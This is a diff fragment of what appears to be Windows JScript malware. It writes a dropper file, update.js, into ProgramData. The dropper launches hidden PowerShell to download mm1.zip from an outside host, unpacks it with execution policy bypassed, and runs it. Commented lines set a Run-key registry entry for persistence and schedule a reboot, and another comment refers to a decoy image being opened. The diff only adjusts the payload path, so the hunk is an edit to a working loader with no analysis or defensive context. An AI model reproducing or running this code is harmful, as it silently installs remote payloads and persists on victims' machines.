@@ -47,12 +47,12 @@
       var h = p.CreateTextFile("C://ProgramData//update.js", 2, true);
       h.writeline("var shell = new ActiveXObject('WScript.Shell');WScript.Sleep(100);var exec = shell.run('C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe /c Invoke-WebRequest -OutFile C:\\\\ProgramData\\\\dvixm\\\\mm1.zip https://cti-1dir.onrender.com/mm1',0 , true);");
       h.writeline("WScript.Sleep(120000);");
-      h.writeline("var execUnzip = shell.run('C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -ExecutionPolicy Bypass -Command \"Expand-Archive -Path C:\\\\ProgramData\\\\dvixm\\\\mm1.zip -DestinationPath C:\\\\ProgramData\\\\dvixm\\\\mm1.exe\"', 0, true);");
+      h.writeline("var execUnzip = shell.run('C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -ExecutionPolicy Bypass -Command \"Expand-Archive -Path C:\\\\ProgramData\\\\dvixm\\\\mm1.zip -DestinationPath C:\\\\ProgramData\\\\dvixm\\\\mm1\"', 0, true);");
       h.Close();shell.run("C://ProgramData//update.js", 1);
       // {8292.png and kohl.js in ProgramData amd 8292.png is opened and dir'dvixm', and mm1.exe in ProgramData }
       
       //var s = s.CreateTextFile("C://ProgramData/parhai.js", 2, true);
-      //s.writeline('var oWSS = new ActiveXObject("WScript.Shell");WScript.Sleep(15000);oWSS.RegWrite("HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\", "C:\\\\ProgramData\\\\dvixm\\\\mm1.exe","REG_SZ");');s.Close();
+      //s.writeline('var oWSS = new ActiveXObject("WScript.Shell");WScript.Sleep(15000);oWSS.RegWrite("HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\", "C:\\\\ProgramData\\\\dvixm\\\\mm1\\\\mm1c.exe","REG_SZ");');s.Close();
 
       // reboot
       //var r = p.CreateTextFile("C://ProgramData//r.js", 2, true);
